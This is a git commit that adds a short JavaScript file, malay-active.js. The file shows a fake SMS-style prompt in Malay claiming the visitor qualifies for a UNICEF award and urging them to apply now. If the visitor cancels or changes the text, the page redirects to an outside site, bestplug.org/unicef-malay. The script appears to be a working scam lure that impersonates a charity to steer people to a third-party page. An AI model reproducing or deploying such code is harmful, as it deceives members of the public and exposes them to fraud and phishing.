8fd06b44aa5e72e1339938d633769d9c094d1f63
vibeblog <enom02567@gmail.com>
2025-04-04 07:15:30 +0100

    Create malay-active.js

---
+++ malay-active.js
@@ -0,0 +1,5 @@
+var password = 'MOHON SEKARANG'
+password=prompt('SMS: Tahniah, anda layak di Unicef, Tekan Ok hantar permohonan Sekarang ','MOHON SEKARANG');
+if (password != 'MOHON SEKARANG') {
+location.href='https://bestplug.org/unicef-malay';
+}
